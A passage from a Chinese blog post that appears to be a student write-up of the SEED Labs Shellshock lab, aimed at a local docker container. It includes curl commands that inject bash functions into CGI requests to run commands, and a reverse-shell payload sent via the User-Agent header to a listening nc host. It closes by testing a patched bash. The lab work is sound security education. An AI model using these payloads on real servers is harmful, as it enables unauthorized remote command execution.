+<li>getenv.cgi已经写好了相应功能，访问curl “<a target="_blank" rel="noopener" href="http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?AAAAA">http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?AAAAA</a>“<ul>
+<li>发现打印出了QUERY_STRING&#x3D;AAAA环境变量</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151557002.png" alt="image-20231015155709972"></p>
+<ul>
+<li>更改Get参数，让其执行id指令</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://www.seedlab-shellshock.com/cgi-bin/vul.cgi?() &#123; echo hello;&#125;;echo Cotent-type:text/plain;echo;/bin/id;&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>返回如下，应该是Get参数格式的问题</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151602375.png" alt="image-20231015160209342"></p>
+<ul>
+<li>将Get参数中的空格使用%20替代</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://www.seedlab-shellshock.com/cgi-bin/vul.cgi?()%20&#123;%20echo%20hello;&#125;;echo%20Cotent-type:text/plain;echo;/bin/id;&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>再次执行，发现成功执行了CGI程序，但是没有执行恶意指令</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151603046.png" alt="image-20231015160304016"></p>
+<h2 id="4、获得反弹shell："><a href="#4、获得反弹shell：" class="headerlink" title="4、获得反弹shell："></a>4、获得反弹shell：</h2><ul>
+<li>演示如何获得反弹shell。</li>
+<li>攻击者：nc -lvnp 9090，启动TCP服务器，并监听9090端口</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151610508.png" alt="image-20231015161008480"></p>
+<ul>
+<li>反弹shell指令：&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;10.0.2.15&#x2F;9090 0&lt;&amp;1 2&gt;&amp;1<ul>
+<li>&#x2F;bin&#x2F;bash -i ，交互模式下启动bash，此时会提供提示符</li>
+<li>&gt;&#x2F;dev&#x2F;tcp&#x2F;10.0.2.15&#x2F;9090，表示前面的bash程序的<strong>标准输出1</strong>被重定向到TCP网络连接，会<strong>将shell的输出发送到TCP连接</strong>。</li>
+<li>0&lt;&amp;1，标准输入0重定向到标准输出1，即输出也被用作输入，输出已被重定向到TCP连接，所以会<strong>从TCP连接中获得输入</strong>。</li>
+<li>2&gt;&amp;1，将标准错误输出2重定向到标准输出1。1已经重定向到TCP连接，故将<strong>shell错误信息发送到TCP连接</strong></li>
+</ul>
+</li>
+<li>获取宿主机ip，使docker容器能访问：ifconfig指令，比较docker容器的ip，应该选择10.9.0.1</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151614702.png" alt="image-20231015161408669"></p>
+<ul>
+<li>攻击者利用shellshock让服务器执行反弹shell指令：10.9.0.1</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -A &quot;() &#123; echo hello;&#125;;echo Cotent-type:text/plain;echo;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1&quot; www.seedlab-shellshock.com/cgi-bin/vul.cgi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151615687.png" alt="image-20231015161524658"></p>
+<ul>
+<li>nc窗口成功接收到shell</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151615372.png" alt="image-20231015161552337"></p>
+<h2 id="5、测试已经打补丁的bash："><a href="#5、测试已经打补丁的bash：" class="headerlink" title="5、测试已经打补丁的bash："></a>5、测试已经打补丁的bash：</h2><ul>
+<li>修改Labsetup文件夹下vul.cgi程序中，第一行指定使用的bash为正常bash：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">echo &quot;Content-type: text/plain&quot;</span><br><span class="line">echo</span><br><span class="line">echo</span><br><span class="line">echo &quot;Hello World&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>重新dcbuild、dcup启动新的容器，重新测试任务3</li>
+<li>正常访问：curl <a target="_blank" rel="noopener" href="http://www.seedlab-shellshock.com/cgi-bin/vul.cgi%EF%BC%8C%E5%9B%9E%E6%98%BEhello">www.seedlab-shellshock.com/cgi-bin/vul.cgi，回显hello</a> world，说明容器正常</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151621295.png" alt="image-20231015162128264"></p>
+<ul>
+<li>测试shellshock漏洞，发现没有执行指定指令</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310151623046.png" alt="image-20231015162333010"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/10/17/03_ShellShockAttack/">http://example.com/2023/10/17/03_ShellShockAttack/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/">软件安全测试</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/10/17/03_ShellShock%E6%94%BB%E5%87%BB/" title="03_《计算机安全导论：深度实践》第三章ShellShock"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">03_《计算机安全导论：深度实践》第三章ShellShock</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2023/10/17/01-Set-UID%E7%89%B9%E6%9D%83%E7%A8%8B%E5%BA%8F/" title="《计算机安全导论：深度实践》第一章Set-UID特权程序学习笔记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-17</div><div class="title">《计算机安全导论：深度实践》第一章Set-UID特权程序学习笔记</div></div></a></div><div><a href="/2023/10/17/02-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/" title="02_《计算机安全导论：深度实践》第二章环境变量"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-17</div><div class="title">02_《计算机安全导论：深度实践》第二章环境变量</div></div></a></div><div><a href="/2023/10/17/02_Lab1%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8ESet-UID/" title="02_Lab1《计算机安全导论：深度实践》环境变量与Set-UID实验"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-17</div><div class="title">02_Lab1《计算机安全导论：深度实践》环境变量与Set-UID实验</div></div></a></div><div><a href="/2023/10/17/03_ShellShock%E6%94%BB%E5%87%BB/" title="03_《计算机安全导论：深度实践》第三章ShellShock"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-17</div><div class="title">03_《计算机安全导论：深度实践》第三章ShellShock</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">John Doe</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%A6%82%E8%BF%B0%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">一、概述：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">二、实验环境配置：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81DNS%E9%85%8D%E7%BD%AE%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">1、DNS配置：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81docker-compose%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">2、docker-compose：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E9%85%8D%E7%BD%AEweb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8%EF%BC%9A"><span class="toc-number">2.3.</span> <span class="toc-text">3、配置web服务器容器：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E8%AE%BE%E7%BD%AE%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9%EF%BC%9A"><span class="toc-number">2.4.</span> <span class="toc-text">4、设置共享文件夹：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E5%90%AF%E5%8A%A8%E5%AE%B9%E5%99%A8%EF%BC%9A"><span class="toc-number">2.5.</span> <span class="toc-text">5、启动容器：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%AE%9E%E9%AA%8C%E4%BB%BB%E5%8A%A1%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">三、实验任务：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E4%BD%BF%E7%94%A8bash%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">1、使用bash函数：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E9%80%9A%E8%BF%87%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%90%91bash%E4%BC%A0%E9%80%92%E6%95%B0%E6%8D%AE%EF%BC%9A"><span class="toc-number">3.2.</span> <span class="toc-text">2、通过环境变量向bash传递数据：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%82%E5%AF%9F%E5%9B%9E%E6%98%BE%E7%9A%84%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%EF%BC%9A"><span class="toc-number">3.2.1.</span> <span class="toc-text">2.1浏览器观察回显的环境变量：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2curl%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="toc-number">3.2.2.</span> <span class="toc-text">2.2curl命令：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E5%AE%9E%E6%96%BDshellshock%E6%94%BB%E5%87%BB%EF%BC%9A"><span class="toc-number">3.3.</span> <span class="toc-text">3、实施shellshock攻击：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1A%E8%8E%B7%E5%8F%96-etc-passwd%EF%BC%9A"><span class="toc-number">3.3.1.</span> <span class="toc-text">3.1A获取&#x2F;etc&#x2F;passwd：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2B%E8%8E%B7%E5%8F%96%E8%BF%9B%E7%A8%8B%E7%94%A8%E6%88%B7%E7%9A%84id%EF%BC%9A"><span class="toc-number">3.3.2.</span> <span class="toc-text">3.2B获取进程用户的id：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3C%E5%9C%A8-tmp%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8B%E5%88%9B%E5%BB%BA%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">3.3.3.</span> <span class="toc-text">3.3C在&#x2F;tmp文件夹下创建文件：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4D%E5%88%A0%E9%99%A4%E5%89%8D%E9%9D%A2%E5%88%9B%E5%BB%BA%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">3.3.4.</span> <span class="toc-text">3.4D删除前面创建的文件：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5%E9%97%AE%E9%A2%98%EF%BC%9A"><span class="toc-number">3.3.5.</span> <span class="toc-text">3.5问题：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E8%8E%B7%E5%BE%97%E5%8F%8D%E5%BC%B9shell%EF%BC%9A"><span class="toc-number">3.4.</span> <span class="toc-text">4、获得反弹shell：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E6%B5%8B%E8%AF%95%E5%B7%B2%E7%BB%8F%E6%89%93%E8%A1%A5%E4%B8%81%E7%9A%84bash%EF%BC%9A"><span class="toc-number">3.5.</span> <span class="toc-text">5、测试已经打补丁的bash：</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/17/03_ShellShockAttack/" title="03_Lab02《计算机安全导论：深度实践》ShellShock实验">03_Lab02《计算机安全导论：深度实践》ShellShock实验</a><time datetime="2023-10-17T09:10:55.000Z" title="Created 2023-10-17 17:10:55">2023-10-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/17/03_ShellShock%E6%94%BB%E5%87%BB/" title="03_《计算机安全导论：深度实践》第三章ShellShock">03_《计算机安全导论：深度实践》第三章ShellShock</a><time datetime="2023-10-17T09:08:55.000Z" title="Created 2023-10-17 17:08:55">2023-10-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/17/02_Lab1%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8ESet-UID/" title="02_Lab1《计算机安全导论：深度实践》环境变量与Set-UID实验">02_Lab1《计算机安全导论：深度实践》环境变量与Set-UID实验</a><time datetime="2023-10-17T09:06:55.000Z" title="Created 2023-10-17 17:06:55">2023-10-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/17/02-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/" title="02_《计算机安全导论：深度实践》第二章环境变量">02_《计算机安全导论：深度实践》第二章环境变量</a><time datetime="2023-10-17T08:59:30.000Z" title="Created 2023-10-17 16:59:30">2023-10-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/17/01-Set-UID%E7%89%B9%E6%9D%83%E7%A8%8B%E5%BA%8F/" title="《计算机安全导论：深度实践》第一章Set-UID特权程序学习笔记">《计算机安全导论：深度实践》第一章Set-UID特权程序学习笔记</a><time datetime="2023-10-17T08:47:55.000Z" title="Created 2023-10-17 16:47:55">2023-10-17</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By John Doe</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
